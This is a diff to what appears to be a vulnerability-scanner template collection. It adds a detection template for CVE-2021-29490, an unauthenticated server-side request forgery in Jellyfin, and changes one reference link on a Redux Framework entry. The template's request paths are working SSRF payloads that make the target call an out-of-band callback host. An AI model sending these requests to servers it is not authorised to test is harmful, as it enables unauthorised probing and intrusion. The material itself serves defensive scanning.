@@ -36068,6 +36068,44 @@
       ]
     },
     {
+      "id": "CVE-2021-29490",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-29490",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",
+          "cvss-score": 5.8,
+          "cwe-id": "CWE-918"
+        },
+        "description": "Jellyfin is a free software media system that provides media from a dedicated server to end-user devices via multiple apps. Verions prior to 10.7.3 vulnerable to unauthenticated Server-Side Request Forgery (SSRF) attacks via the imageUrl parameter.",
+        "name": "Jellyfin <10.7.2 SSRF",
+        "reference": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-29490",
+          "https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,ssrf,jellyfin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Images/Remote?imageUrl=http://{{interactsh-url}}",
+            "{{BaseURL}}/Items/RemoteSearch/Image?ImageUrl=http://{{interactsh-url}}&ProviderName=TheMovieDB"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-29622",
       "info": {
         "author": "geeknik",
@@ -38518,7 +38556,7 @@
         "name": "Redux Framework - Unauthenticated Sensitive Information Disclosure",
         "reference": [
           "https://www.wordfence.com/blog/2021/09/over-1-million-sites-affected-by-redux-framework-vulnerabilities/",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314",
+          "https://wahaz.medium.com/unauthenticated-sensitive-information-disclosure-at-redacted-2702224098c",
           "https://blog.sorcery.ie/posts/redux_wordpress/"
         ],
         "severity": "medium",
